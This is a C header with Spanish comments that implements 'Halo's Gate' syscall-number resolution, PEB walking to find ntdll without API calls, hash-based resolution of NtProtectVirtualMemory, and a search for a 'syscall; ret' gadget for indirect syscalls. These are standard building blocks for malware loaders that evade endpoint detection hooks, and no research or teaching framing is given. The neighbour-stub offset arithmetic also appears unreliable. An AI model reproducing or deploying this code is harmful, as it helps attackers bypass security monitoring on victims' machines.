#ifndef SYSCALLS_H
#define SYSCALLS_H

#include <windows.h>
#include <winternl.h>
#include "api_hashes.h"

typedef struct _SYSCALL_ENTRY {
    WORD ssn;
    PVOID address;
    PVOID cleanAddress;
} SYSCALL_ENTRY, *PSYSCALL_ENTRY;

// =============================================================================
// RESOLUCIÓN DE SSN (HALO'S GATE ROBUSTO)
// =============================================================================

static WORD GetSSN(PVOID pFunc) {
    if (!pFunc) return 0;
    PBYTE p = (PBYTE)pFunc;

    // Caso 1: Función limpia (mov r10, rcx; mov eax, ssn)
    if (p[0] == 0x4C && p[1] == 0x8B && p[2] == 0xD1 && p[3] == 0xB8) {
        return *(WORD*)(p + 4);
    }

    // Caso 2: Función hookeada - Buscar stubs vecinos mediante escaneo de patrones
    // No usamos un stride fijo de 32 bytes porque ntdll puede variar.
    // Buscamos el patrón 4C 8B D1 B8 (11 bytes del stub estándar)
    for (int i = 1; i <= 512; i++) {
        // Buscar hacia arriba
        PBYTE pUp = p - i;
        if (pUp[0] == 0x4C && pUp[1] == 0x8B && pUp[2] == 0xD1 && pUp[3] == 0xB8) {
            // El SSN de nuestra función es (SSN del vecino) + (número de funciones de diferencia)
            // Estimamos la diferencia basándonos en que cada stub suele medir 32 bytes (alineación)
            return *(WORD*)(pUp + 4) + (i / 32); 
        }
        // Buscar hacia abajo
        PBYTE pDown = p + i;
        if (pDown[0] == 0x4C && pDown[1] == 0x8B && pDown[2] == 0xD1 && pDown[3] == 0xB8) {
            return *(WORD*)(pDown + 4) - (i / 32);
        }
    }

    return 0;
}

static PVOID FindSyscallGadgetViaHash() {
    PPEB pPeb = (PPEB)__readgsqword(0x60);
    PLIST_ENTRY pHead = &pPeb->Ldr->InMemoryOrderModuleList;
    PLIST_ENTRY pEntry = pHead->Flink;
    PVOID hNtdll = NULL;
    
    while (pEntry != pHead) {
        LDR_DATA_TABLE_ENTRY_PTR *pMod = CONTAINING_RECORD(pEntry, LDR_DATA_TABLE_ENTRY_PTR, InMemoryOrderLinks);
        if (pMod->BaseDllName.Buffer && pMod->BaseDllName.Buffer[0] == L'n') {
            hNtdll = pMod->DllBase;
            break;
        }
        pEntry = pEntry->Flink;
    }
    
    if (!hNtdll) return NULL;
    PVOID pFunc = ResolveApiByHash(hNtdll, HASH_NtProtectVirtualMemory);
    if (!pFunc) return NULL;

    PBYTE pByte = (PBYTE)pFunc;
    for (int i = 0; i < 64; i++) {
        if (pByte[i] == 0x0F && pByte[i+1] == 0x05 && pByte[i+2] == 0xC3) return (PVOID)(pByte + i);
    }
    return NULL;
}

extern "C" NTSTATUS InvokeSyscall(WORD ssn, PVOID gadget, ...);

#endif
